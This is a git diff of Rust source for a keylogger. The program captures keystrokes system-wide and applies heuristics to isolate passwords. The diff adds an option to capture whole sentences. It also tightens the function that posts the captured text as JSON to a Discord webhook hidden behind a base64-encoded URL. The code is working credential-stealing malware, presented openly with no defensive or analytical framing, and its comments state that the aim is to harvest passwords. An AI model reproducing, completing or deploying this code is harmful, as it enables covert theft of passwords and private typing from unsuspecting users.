@@ -1,22 +1,25 @@
-// Crate to get cross-platform input events.
-// I will replace with winapi if it gets annoying.
-use rdev::{EventType, Key};
+use rdev::{EventType, Key}; // Bane of my existance
 use reqwest::header::CONTENT_TYPE;
 use std::{
     io::Read,
-    slice::SliceIndex,
     sync::mpsc::{self, Receiver, Sender},
     time::{Duration, Instant},
 };
 
-// change this to your webhook URL
-const HOOK_URL: &str = "your webhook in base64";
+// CONFIGURATION LOL
+
+// change this to your webhook URL - CHANGE B4 COMMITTING
+const HOOK_URL: &str = "WEBHOOK";
+
+// Change this to capture whole sentences or just passwords.
+const GET_SENTENCES: bool = false;
 
 // This keylogger is aiming to ONLY get passwords through a variety of methods.
 // If there is a space key entered, for example, we can ignore the proceding word.
 // We could also only get keys entered into a list of programs, such as Chrome.
 
 fn main() -> Result<(), Box<rdev::ListenError>> {
+    println!("MAKE SURE TO DELETE THE WEBHOOK BEFORE COMITTING.");
     // a list of modifiers so we can ignore any keyboard shortcuts.
     let modifier_keys = [Key::Alt, Key::AltGr, Key::MetaLeft, Key::MetaRight];
     // how to long to wait if we pressed a modifier
@@ -52,7 +55,8 @@ fn main() -> Result<(), Box<rdev::ListenError>> {
                     Key::Return => {
                         // at the least a password will be >= 5 characters.
                         if current_word_buf.len() >= 5 {
-                            current_word_buf.append_to_log();
+                            // unwrap because  closure returns some other error.
+                            current_word_buf.append_to_log().unwrap();
                             current_word_buf.clear();
                             cursor_pos = 0;
                         } else {
@@ -61,8 +65,19 @@ fn main() -> Result<(), Box<rdev::ListenError>> {
                         }
                     }
                     Key::Space => {
-                        current_word_buf.clear();
-                        cursor_pos = 0;
+                        if !GET_SENTENCES {
+                            current_word_buf.clear();
+                            cursor_pos = 0;
+                        } else {
+                            // Do nothing except add a literal space.
+                            handle_key(
+                                Some(" ".to_string()),
+                                ctrl_held,
+                                modkey_held,
+                                &mut cursor_pos,
+                                &mut current_word_buf,
+                            );
+                        }
                     }
                     Key::RightArrow => {
                         // Don't move cursor past word.
@@ -184,25 +199,26 @@ fn start_timer(tx: Sender<Instant>) -> Result<(), std::sync::mpsc::SendError<Ins
 /// To make methods that take &self for Vec<String>.
 trait VectorExt {
     /// Appends to the log, for now it will be a discord webhook because why not?
-    fn append_to_log(&self);
+    fn append_to_log(&self) -> Result<(), Box<dyn std::error::Error>>;
 }
 
 impl VectorExt for Vec<String> {
     /// Appends to the log, for now it will be a discord webhook because why not?
     /// TODO: Stop being lazy.
-    fn append_to_log(&self) {
+    fn append_to_log(&self) -> Result<(), Box<dyn std::error::Error>> {
         let mut url = String::new();
         base64_url::decode(&HOOK_URL)
-            .unwrap()
+            .expect("is there a webhook and is it in base64url? please check.")
             .as_slice()
-            .read_to_string(&mut url)
-            .unwrap();
+            .read_to_string(&mut url)?;
 
         let payload = format!("{{\"content\":\"{}\"}}", self.join(""));
         reqwest::blocking::Client::new()
             .post(url)
             .body(payload)
             .header(CONTENT_TYPE, "application/json")
-            .send();
+            .send()?;
+
+        Ok(())
     }
 }
